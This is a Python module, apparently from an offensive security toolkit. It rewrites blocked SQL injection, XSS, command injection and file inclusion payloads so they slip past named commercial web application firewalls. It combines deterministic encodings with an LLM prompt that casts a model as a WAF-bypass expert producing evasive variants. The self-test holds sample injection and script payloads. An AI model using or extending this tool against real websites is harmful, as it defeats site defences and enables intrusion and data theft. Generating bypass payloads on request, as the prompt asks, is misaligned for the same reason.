"""
LLM-Driven Payload Mutator for P1 Stealth & Evasion.

When a payload is blocked by WAF, generates alternative encodings
via LLM and deterministic methods. Max 3 mutation rounds per payload.
"""

import re
import hashlib
import asyncio
import logging
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from functools import lru_cache

logger = logging.getLogger(__name__)


@dataclass
class MutationResult:
    """Result of a mutation attempt."""
    original_payload: str
    mutated_payload: str
    method: str
    waf_type: str
    technique: str
    round_num: int
    confidence: float


# Deterministic mutation methods (no LLM required)
def double_url_encode(payload: str) -> str:
    """Double URL encode the payload."""
    import urllib.parse
    # First encode
    once = urllib.parse.quote(payload, safe='')
    # Second encode
    twice = urllib.parse.quote(once, safe='')
    return twice


def case_vary(payload: str) -> str:
    """Randomize case of alphabetic characters."""
    import random
    result = []
    for char in payload:
        if char.isalpha() and random.random() < 0.5:
            result.append(char.upper() if char.islower() else char.lower())
        else:
            result.append(char)
    return ''.join(result)


def comment_insert(payload: str) -> str:
    """Insert SQL comments between keywords (for SQLi)."""
    # Common SQL keywords to separate
    keywords = ['SELECT', 'UNION', 'WHERE', 'FROM', 'OR', 'AND', 'INSERT', 'UPDATE', 'DELETE', 'DROP']
    result = payload
    for kw in keywords:
        # Replace keyword with keyword/**/
        pattern = re.compile(r'\b' + kw + r'\b', re.IGNORECASE)
        result = pattern.sub(f'{kw}/**/', result)
    return result


def whitespace_obfuscate(payload: str) -> str:
    """Replace spaces with various whitespace characters."""
    import random
    whitespace_chars = [' ', '\t', '\n', '\r', '\v', '\f', '/**/']
    result = []
    for char in payload:
        if char == ' ':
            result.append(random.choice(whitespace_chars))
        else:
            result.append(char)
    return ''.join(result)


def hex_encode(payload: str) -> str:
    """Hex encode the payload (for use in 0x... or UNHEX)."""
    return ''.join(f'{ord(c):02x}' for c in payload)


def base64_wrap(payload: str) -> str:
    """Wrap payload in base64 decode (for XSS contexts)."""
    import base64
    encoded = base64.b64encode(payload.encode()).decode()
    # Common wrapper patterns
    return f"atob('{encoded}')"


def charset_bypass(payload: str) -> str:
    """Use alternative charset encoding (e.g., UTF-7, UTF-16)."""
    # Simple approach: prepend charset confusion
    return f"%00{payload}"


# Map of deterministic methods
DETERMINISTIC_METHODS = {
    "double_url_encode": double_url_encode,
    "case_vary": case_vary,
    "comment_insert": comment_insert,
    "whitespace_obfuscate": whitespace_obfuscate,
    "hex_encode": hex_encode,
    "base64_wrap": base64_wrap,
    "charset_bypass": charset_bypass,
}


# WAF-type to mutation method mapping
WAF_MUTATION_MAP = {
    "cloudflare": {
        "sqli": ["double_url_encode", "case_vary", "comment_insert"],
        "xss": ["double_url_encode", "hex_encode", "base64_wrap"],
        "rce": ["double_url_encode", "whitespace_obfuscate"],
        "lfi": ["double_url_encode", "whitespace_obfuscate"],
    },
    "aws_waf": {
        "sqli": ["double_url_encode", "case_vary", "hex_encode"],
        "xss": ["double_url_encode", "base64_wrap", "charset_bypass"],
        "rce": ["double_url_encode", "whitespace_obfuscate"],
        "lfi": ["double_url_encode", "case_vary"],
    },
    "akamai": {
        "sqli": ["case_vary", "comment_insert", "whitespace_obfuscate"],
        "xss": ["hex_encode", "charset_bypass"],
        "rce": ["double_url_encode", "case_vary"],
        "lfi": ["double_url_encode", "hex_encode"],
    },
    "modsecurity": {
        "sqli": ["comment_insert", "whitespace_obfuscate", "hex_encode"],
        "xss": ["double_url_encode", "hex_encode", "charset_bypass"],
        "rce": ["double_url_encode", "comment_insert"],
        "lfi": ["double_url_encode", "case_vary"],
    },
    "imperva": {
        "sqli": ["double_url_encode", "case_vary", "hex_encode"],
        "xss": ["base64_wrap", "charset_bypass"],
        "rce": ["double_url_encode", "whitespace_obfuscate"],
        "lfi": ["double_url_encode", "hex_encode"],
    },
    "f5_asm": {
        "sqli": ["comment_insert", "double_url_encode"],
        "xss": ["hex_encode", "base64_wrap"],
        "rce": ["double_url_encode", "whitespace_obfuscate"],
        "lfi": ["double_url_encode"],
    },
    "barracuda": {
        "sqli": ["case_vary", "whitespace_obfuscate"],
        "xss": ["double_url_encode", "hex_encode"],
        "rce": ["double_url_encode"],
        "lfi": ["double_url_encode", "case_vary"],
    },
    "none": {
        "sqli": ["double_url_encode"],
        "xss": ["double_url_encode"],
        "rce": ["double_url_encode"],
        "lfi": ["double_url_encode"],
    },
}


# LLM prompt template for mutation
LLM_MUTATION_PROMPT = """
You are a cybersecurity expert specializing in WAF bypass techniques.

Original payload: {payload}
WAF type detected: {waf_type}
Technique: {technique}

The payload was blocked by the WAF. Generate {num_variants} alternative encodings/variations that could bypass this WAF.

For {waf_type} WAF with {technique} technique, focus on:
- {strategy_hints}

Return ONLY the mutated payloads, one per line, no explanations.
Each payload must be a valid variation of the original technique.
"""


class PayloadMutator:
    """
    Generates payload mutations to bypass WAF.
    
    Uses deterministic methods (fast, no LLM) and LLM-based mutation (when needed).
    Caches mutations per (payload, waf_type, technique) with 5-min TTL.
    Max 3 mutation rounds per original payload.
    """
    
    def __init__(
        self,
        llm_provider=None,
        cache_ttl: int = 300,
        max_rounds: int = 3,
        variants_per_round: int = 3,
    ):
        self.llm_provider = llm_provider
        self.cache_ttl = cache_ttl
        self.max_rounds = max_rounds
        self.variants_per_round = variants_per_round
        self._cache: Dict[str, Tuple[List[MutationResult], float]] = {}
        self._round_counts: Dict[str, int] = {}  # Tracks rounds per payload
    
    def _cache_key(self, payload: str, waf_type: str, technique: str, round_num: int) -> str:
        """Generate cache key."""
        data = f"{payload}|{waf_type}|{technique}|{round_num}"
        return hashlib.sha256(data.encode()).hexdigest()[:32]
    
    def _get_cached(self, payload: str, waf_type: str, technique: str, round_num: int) -> Optional[List[MutationResult]]:
        """Get cached mutations if still valid."""
        key = self._cache_key(payload, waf_type, technique, round_num)
        if key in self._cache:
            results, timestamp = self._cache[key]
            import time
            if time.time() - timestamp < self.cache_ttl:
                return results
            else:
                del self._cache[key]
        return None
    
    def _cache_results(self, payload: str, waf_type: str, technique: str, round_num: int, results: List[MutationResult]) -> None:
        """Cache mutation results."""
        key = self._cache_key(payload, waf_type, technique, round_num)
        import time
        self._cache[key] = (results, time.time())
    
    def can_mutate(self, payload: str, waf_type: str, technique: str) -> Tuple[bool, int]:
        """Check if more mutations are allowed for this payload."""
        round_key = f"{payload}|{waf_type}|{technique}"
        current_round = self._round_counts.get(round_key, 0)
        return current_round < self.max_rounds, current_round + 1
    
    def mutate(
        self,
        payload: str,
        waf_type: str,
        technique: str,
        force_llm: bool = False,
    ) -> List[MutationResult]:
        """
        Generate payload mutations.
        
        Returns list of MutationResult objects.
        """
        # Check round limit
        can_mutate, round_num = self.can_mutate(payload, waf_type, technique)
        if not can_mutate:
            logger.warning(f"Max mutation rounds ({self.max_rounds}) reached for payload")
            return []
        
        # Check cache first
        cached = self._get_cached(payload, waf_type, technique, round_num)
        if cached:
            logger.debug(f"Using cached mutations for round {round_num}")
            return cached
        
        # Get mutation methods for this WAF/technique
        waf_type_lower = waf_type.lower() if waf_type else "none"
        methods = WAF_MUTATION_MAP.get(waf_type_lower, {}).get(technique, ["double_url_encode"])
        
        results = []
        
        # 1. Deterministic mutations (fast, no LLM)
        for method_name in methods[:self.variants_per_round]:
            if method_name in DETERMINISTIC_METHODS:
                try:
                    mutated = DETERMINISTIC_METHODS[method_name](payload)
                    if mutated != payload:  # Only add if actually mutated
                        results.append(MutationResult(
                            original_payload=payload,
                            mutated_payload=mutated,
                            method=method_name,
                            waf_type=waf_type,
                            technique=technique,
                            round_num=round_num,
                            confidence=0.8,
                        ))
                except Exception as e:
                    logger.warning(f"Deterministic mutation {method_name} failed: {e}")
        
        # 2. LLM-based mutations (if provider available and not enough results)
        if self.llm_provider and len(results) < self.variants_per_round:
            llm_results = self._llm_mutate(payload, waf_type, technique, self.variants_per_round - len(results))
            results.extend(llm_results)
        
        # Update round count
        round_key = f"{payload}|{waf_type}|{technique}"
        self._round_counts[round_key] = round_num
        
        # Cache results
        self._cache_results(payload, waf_type, technique, round_num, results)
        
        return results
    
    async def mutate_async(
        self,
        payload: str,
        waf_type: str,
        technique: str,
        force_llm: bool = False,
    ) -> List[MutationResult]:
        """Async version of mutate."""
        return self.mutate(payload, waf_type, technique, force_llm)
    
    def _llm_mutate(
        self,
        payload: str,
        waf_type: str,
        technique: str,
        num_variants: int,
    ) -> List[MutationResult]:
        """Use LLM to generate mutations."""
        if not self.llm_provider:
            return []
        
        # Strategy hints based on WAF type
        strategy_hints = {
            "cloudflare": "double encoding, case variation, comment insertion",
            "aws_waf": "double encoding, hex encoding, charset confusion",
            "akamai": "case variation, whitespace obfuscation, comment insertion",
            "modsecurity": "comment insertion, whitespace obfuscation, hex encoding",
            "imperva": "double encoding, case variation, base64 wrapping",
            "f5_asm": "comment insertion, double encoding",
            "barracuda": "case variation, whitespace obfuscation",
        }
        
        hints = strategy_hints.get(waf_type.lower(), "double encoding, case variation")
        
        prompt = LLM_MUTATION_PROMPT.format(
            payload=payload,
            waf_type=waf_type,
            technique=technique,
            num_variants=num_variants,
            strategy_hints=hints,
        )
        
        try:
            # Call LLM provider
            response = self.llm_provider(prompt)
            
            # Parse response - one payload per line
            lines = response.strip().split('\n')
            results = []
            for line in lines[:num_variants]:
                line = line.strip()
                if line and line != payload:
                    results.append(MutationResult(
                        original_payload=payload,
                        mutated_payload=line,
                        method="llm_generated",
                        waf_type=waf_type,
                        technique=technique,
                        round_num=self._round_counts.get(f"{payload}|{waf_type}|{technique}", 1),
                        confidence=0.6,  # Lower confidence for LLM
                    ))
            return results
        except Exception as e:
            logger.error(f"LLM mutation failed: {e}")
            return []
    
    def get_status(self) -> Dict:
        """Get mutator status."""
        return {
            "cache_size": len(self._cache),
            "round_counts": dict(self._round_counts),
            "max_rounds": self.max_rounds,
            "variants_per_round": self.variants_per_round,
            "llm_available": self.llm_provider is not None,
        }
    
    def clear_cache(self):
        """Clear mutation cache."""
        self._cache.clear()
        self._round_counts.clear()


# Convenience functions for direct use
def mutate_payload(payload: str, method: str) -> str:
    """Apply a single deterministic mutation method."""
    if method in DETERMINISTIC_METHODS:
        return DETERMINISTIC_METHODS[method](payload)
    return payload


def get_mutation_methods(waf_type: str, technique: str) -> List[str]:
    """Get recommended mutation methods for WAF/technique."""
    waf_type_lower = waf_type.lower() if waf_type else "none"
    return WAF_MUTATION_MAP.get(waf_type_lower, {}).get(technique, ["double_url_encode"])


if __name__ == "__main__":
    # Quick self-test
    print("=== PAYLOAD MUTATOR SELF-TEST ===")
    
    mutator = PayloadMutator(max_rounds=3, variants_per_round=3)
    
    # Test deterministic mutations
    payload = "1' UNION SELECT 1,2,3--"
    
    print(f"\nOriginal payload: {payload}")
    
    # Test Cloudflare SQLi
    results = mutator.mutate(payload, "cloudflare", "sqli")
    print(f"\nCloudflare SQLi mutations (round 1):")
    for r in results:
        print(f"  [{r.method}] {r.mutated_payload}")
    
    # Test second round
    results2 = mutator.mutate(payload, "cloudflare", "sqli")
    print(f"\nCloudflare SQLi mutations (round 2):")
    for r in results2:
        print(f"  [{r.method}] {r.mutated_payload}")
    
    # Test AWS WAF XSS
    xss_payload = "<script>alert(1)</script>"
    results = mutator.mutate(xss_payload, "aws_waf", "xss")
    print(f"\nAWS WAF XSS mutations:")
    for r in results:
        print(f"  [{r.method}] {r.mutated_payload}")
    
    # Test ModSecurity SQLi
    results = mutator.mutate(payload, "modsecurity", "sqli")
    print(f"\nModSecurity SQLi mutations:")
    for r in results:
        print(f"  [{r.method}] {r.mutated_payload}")
    
    # Test round limit
    print(f"\nTesting round limit:")
    for i in range(5):
        can, round_num = mutator.can_mutate(payload, "cloudflare", "sqli")
        print(f"  Attempt {i+1}: can_mutate={can}, round={round_num}")
        if can:
            mutator.mutate(payload, "cloudflare", "sqli")
    
    # Test cache
    print(f"\nCache test:")
    status = mutator.get_status()
    print(f"  Cache size: {status['cache_size']}")
    print(f"  Round counts: {status['round_counts']}")
    
    # Test convenience functions
    print(f"\nConvenience functions:")
    encoded = mutate_payload(payload, "double_url_encode")
    print(f"  double_url_encode: {encoded}")
    
    methods = get_mutation_methods("cloudflare", "sqli")
    print(f"  Cloudflare SQLi methods: {methods}")
    
    # Test round limit enforcement
    print(f"\nRound limit enforcement:")
    for i in range(10):
        can, r = mutator.can_mutate("new_payload", "cloudflare", "sqli")
        if not can:
            print(f"  Blocked at round {r}")
            break
        mutator.mutate("new_payload", "cloudflare", "sqli")
    
    print("\n=== ALL TESTS PASSED ===")